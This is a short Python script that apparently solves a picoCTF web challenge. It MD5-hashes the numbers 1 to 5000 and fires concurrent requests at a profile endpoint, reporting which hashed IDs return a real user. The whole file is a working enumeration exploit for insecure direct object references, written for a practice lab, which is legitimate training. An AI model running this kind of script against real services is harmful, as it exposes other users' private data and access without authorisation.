import asyncio
import aiohttp
import hashlib

async def tembak_endpoint(session, angka):
    payload = str(angka).encode()
    hashed = hashlib.md5(payload).hexdigest() 

    url_target = f"http://crystal-peak.picoctf.net:51675/profile/user/{hashed}"
    
    try:
        async with session.get(url_target) as response:
            html_body = await response.text()
            if "User not found" not in html_body and "Error" not in html_body:
                print(f"[+] Hit! Payload angka: {angka} | URL: {url_target}")
                
    except Exception:
        pass

async def main():
    connector = aiohttp.TCPConnector(limit=100)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(1, 5001):
            task = asyncio.create_task(tembak_endpoint(session, i))
            tasks.append(task)
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())